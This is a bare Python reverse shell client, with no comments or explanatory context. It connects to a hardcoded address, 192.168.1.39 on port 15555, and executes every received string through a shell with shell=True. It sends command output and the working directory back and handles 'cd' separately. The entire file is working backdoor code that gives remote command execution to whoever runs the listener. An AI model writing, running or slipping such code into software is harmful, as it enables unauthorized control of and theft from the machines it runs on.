import socket
import os
import subprocess

s = socket.socket()

s.connect(("192.168.1.39", 15555))

while True:

    data = s.recv(1024)

    if data[:2].decode("utf-8") == "cd":

        try:

            os.chdir(data[3:].decode("utf-8"))
            s.send(os.getcwd().encode("utf-8"))

        except FileNotFoundError:

            s.send("File could not be found...".encode("utf-8"))

    else:

        if len(data) > 0:

            cmd = subprocess.Popen(data.decode("utf-8"), shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)

            output = cmd.stdout.read() + cmd.stderr.read()

            output_str = str(output, encoding="utf-8")

            directory = os.getcwd()

            s.send(str.encode(output_str + "\n" + directory, encoding = "utf-8"))